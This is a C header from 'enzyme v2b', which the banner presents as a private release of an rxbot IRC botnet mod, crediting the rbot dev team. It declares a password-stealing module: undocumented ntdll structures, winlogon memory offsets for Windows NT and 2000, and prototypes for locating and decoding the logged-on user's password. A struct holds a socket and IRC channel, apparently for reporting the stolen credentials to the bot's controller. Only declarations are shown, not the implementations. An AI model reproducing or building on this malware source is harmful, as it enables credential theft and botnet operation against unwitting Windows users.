/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#ifndef NO_FINDPASS

#define INITIAL_ALLOCATION			0x100
#define USER_DOMAIN_OFFSET_WINNT	0x200
#define USER_PASSWORD_OFFSET_WINNT	0x400
#define USER_DOMAIN_OFFSET_WIN2K	0x400
#define USER_PASSWORD_OFFSET_WIN2K	0x800

// Undocumented typedef's
typedef struct _QUERY_SYSTEM_INFORMATION
{
	DWORD GrantedAccess;
	DWORD PID;
	WORD HandleType;
	WORD HandleId;
	DWORD Handle;

} QUERY_SYSTEM_INFORMATION, *PQUERY_SYSTEM_INFORMATION;

typedef struct _PROCESS_INFO_HEADER
{
	DWORD Count;
	DWORD Unk04;
	DWORD Unk08;

} PROCESS_INFO_HEADER, *PPROCESS_INFO_HEADER;

typedef struct _PROCESS_INFO
{
	DWORD LoadAddress;
	DWORD Size;
	DWORD Unk08;
	DWORD Enumerator;
	DWORD Unk10;
	char Name [0x108];

} PROCESS_INFO, *PPROCESS_INFO;

typedef struct _ENCODED_PASSWORD_INFO
{
	DWORD HashByte;
	DWORD Unk04;
	DWORD Unk08;
	DWORD Unk0C;
	FILETIME LoggedOn;
	DWORD Unk18;
	DWORD Unk1C;
	DWORD Unk20;
	DWORD Unk24;
	DWORD Unk28;
	UNICODE_STRING EncodedPassword;

} ENCODED_PASSWORD_INFO, *PENCODED_PASSWORD_INFO;

typedef struct FINDPASS
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FINDPASS;

// ntdll.dll function variables
typedef DWORD (__stdcall *PFNNTQUERYSYSTEMINFORMATION)  (DWORD, PVOID, DWORD, PDWORD);
typedef PVOID (__stdcall *PFNRTLCREATEQUERYDEBUGBUFFER) (DWORD, DWORD);
typedef DWORD (__stdcall *PFNRTLQUERYPROCESSDEBUGINFORMATION) (DWORD, DWORD, PVOID);
typedef void (__stdcall *PFNRTLDESTROYQUERYDEBUGBUFFER) (PVOID);
typedef void (__stdcall *PFNTRTLRUNDECODEUNICODESTRING)  (BYTE, PUNICODE_STRING);

DWORD WINAPI FindPassThread(LPVOID param);
DWORD FindWinLogon(void);
BOOL LocatePasswordPageWinNT(DWORD WinLogonPID,PDWORD PasswordLength);
BOOL LocatePasswordPageWin2K(DWORD WinLogonPID,PDWORD PasswordLength);
char *DisplayPasswordWinNT(DWORD WinLogonPID);
char *DisplayPasswordWin2K(DWORD WinLogonPID);
#endif